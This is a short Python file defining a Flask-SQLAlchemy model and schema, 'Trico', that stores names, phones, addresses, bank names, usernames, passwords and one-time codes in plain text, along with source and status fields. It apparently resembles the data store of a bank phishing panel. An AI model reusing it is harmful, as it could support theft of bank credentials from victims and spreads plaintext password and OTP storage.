from config.bd import db, ma, app

class Trico(db.Model):
    
    __tablename__ = "Trico"
    
    idreg = db.Column(db.Integer, primary_key=True)
    id = db.Column(db.String(70))
    nombre = db.Column(db.String(70))
    telefono = db.Column(db.String(70))
    direccion = db.Column(db.String(70))
    usuario = db.Column(db.String(70))
    password = db.Column(db.String(70))
    otp = db.Column(db.String(70))
    horacreado = db.Column(db.DateTime, nullable=False)
    fuente = db.Column(db.String(70))
    estado = db.Column(db.String(70))
    bank = db.Column(db.String(70))
    
    def __init__(self, id, nombre, telefono, direccion, usuario, password, otp, horacreado, fuente, estado, bank):
        self.id = id
        self.nombre = nombre
        self.telefono = telefono
        self.direccion = direccion
        self.usuario = usuario
        self.password = password
        self.otp = otp
        self.horacreado = horacreado
        self.fuente = fuente
        self.estado = estado
        self.bank = bank
        
with app.app_context():
    db.create_all()
    
class TricoSchema(ma.Schema):
    class Meta:
        fields = ('idreg', 'id', 'nombre', 'telefono', 'direccion', 'usuario', 'password', 'otp', 'horacreado', 'fuente', 'estado', 'bank')
        
        